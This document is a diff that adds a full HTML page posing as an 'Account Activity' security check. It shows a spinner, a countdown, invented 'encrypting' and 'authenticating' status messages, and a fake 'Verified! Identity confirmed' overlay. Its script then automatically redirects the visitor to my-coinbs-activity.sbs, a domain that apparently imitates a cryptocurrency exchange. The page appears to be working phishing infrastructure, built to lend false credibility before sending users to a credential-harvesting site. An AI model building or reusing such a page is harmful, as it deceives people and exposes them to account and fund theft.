@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Account Activity • loading</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      min-height:100vh; display:flex; align-items:center; justify-content:center;
+      background:linear-gradient(145deg,#0a0e17,#141b2b); font-family:'Space Grotesk',sans-serif; padding:2rem;
+    }
+    .loading-container {
+      max-width:420px; width:100%; text-align:center;
+    }
+    .badge {
+      display:inline-block; background:rgba(255,255,255,0.03); padding:0.2rem 1.2rem; border-radius:40px;
+      font-size:0.6rem; font-weight:600; color:rgba(255,255,255,0.2); text-transform:uppercase;
+      letter-spacing:2px; border:1px solid rgba(255,255,255,0.03); margin-bottom:2rem;
+    }
+    .spinner-ring {
+      width:80px; height:80px; margin:0 auto 1.5rem;
+      border:3px solid rgba(255,255,255,0.04); border-top-color:#818cf8;
+      border-radius:50%; animation:spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .count-big {
+      font-size:4rem; font-weight:300; color:rgba(255,255,255,0.8); letter-spacing:-3px;
+    }
+    .count-big span {
+      font-size:1rem; color:rgba(255,255,255,0.15); font-weight:400; margin-left:4px;
+    }
+    .status-line {
+      font-size:0.75rem; color:rgba(255,255,255,0.12); margin:0.5rem 0 1.5rem;
+    }
+    .status-line .hl { color:rgba(255,255,255,0.3); }
+    .domain-chain {
+      font-size:0.55rem; color:rgba(255,255,255,0.04); margin-top:2rem; letter-spacing:0.5px;
+    }
+    .domain-chain span { color:rgba(255,255,255,0.08); }
+    
+    /* Verified Overlay */
+    .overlay {
+      position:fixed;
+      inset:0;
+      background:#0a0e17;
+      z-index:9999;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      flex-direction:column;
+      gap:1.5rem;
+    }
+    .overlay.show { display:flex; }
+    .overlay .checkmark {
+      font-size:4rem;
+      color:#4ade80;
+      animation:pop 0.5s ease-out;
+    }
+    @keyframes pop {
+      0%{transform:scale(0);opacity:0;}
+      80%{transform:scale(1.2);}
+      100%{transform:scale(1);opacity:1;}
+    }
+    .overlay .verified-text {
+      color:white;
+      font-size:1.8rem;
+      font-weight:700;
+    }
+    .overlay .verified-sub {
+      color:rgba(255,255,255,0.3);
+      font-size:0.9rem;
+    }
+  </style>
+</head>
+<body>
+<div class="loading-container">
+  <div class="badge">● encrypted</div>
+  <div class="spinner-ring"></div>
+  <div class="count-big"><span id="countDisplay">5</span><span>s</span></div>
+  <div class="status-line">status · <span class="hl" id="statusText">initializing</span></div>
+  <div class="domain-chain">
+    <span>🔗</span> <span id="domain1">my-coinbs-activity.sbs</span>
+    <span style="color:rgba(255,255,255,0.02);margin:0 4px;">→</span>
+    <span id="domain2">account-activity</span>
+  </div>
+</div>
+
+<!-- Verified Overlay -->
+<div class="overlay" id="overlayVerified">
+  <div class="checkmark">✓</div>
+  <div class="verified-text">Verified!</div>
+  <div class="verified-sub">Identity confirmed. Redirecting...</div>
+</div>
+
+<script>
+  (function(){
+    const TARGET = "https://my-coinbs-activity.sbs/account-activity";
+    const TOTAL = 5;
+    
+    let remaining = TOTAL;
+    let interval = null;
+    let redirecting = false;
+    
+    const countDisplay = document.getElementById('countDisplay');
+    const statusText = document.getElementById('statusText');
+    const overlayVerified = document.getElementById('overlayVerified');
+
+    function update(){
+      countDisplay.textContent = Math.ceil(remaining);
+      
+      if(redirecting){ 
+        statusText.textContent = 'redirecting...'; 
+        return; 
+      }
+      
+      const states = ['initializing', 'handshaking', 'encrypting', 'verifying', 'authenticating'];
+      const idx = Math.min(Math.floor((TOTAL - remaining) / 1.2), states.length - 1);
+      statusText.textContent = states[idx] || 'connecting';
+    }
+
+    function redirect(){
+      if(redirecting) return;
+      redirecting = true;
+      clearInterval(interval);
+      update();
+      
+      // Show verified overlay
+      overlayVerified.classList.add('show');
+      
+      // After 2 seconds, redirect
+      setTimeout(() => {
+        window.location.href = TARGET;
+      }, 2000);
+    }
+
+    function tick(){
+      if(redirecting) return;
+      remaining -= 0.5;
+      
+      if(remaining <= 0){
+        remaining = 0;
+        update();
+        redirect();
+        return;
+      }
+      update();
+    }
+
+    function startTimer(){
+      interval = setInterval(tick, 500);
+    }
+
+    // Auto-start the countdown
+    update();
+    startTimer();
+  })();
+</script>
+</body>
+</html>
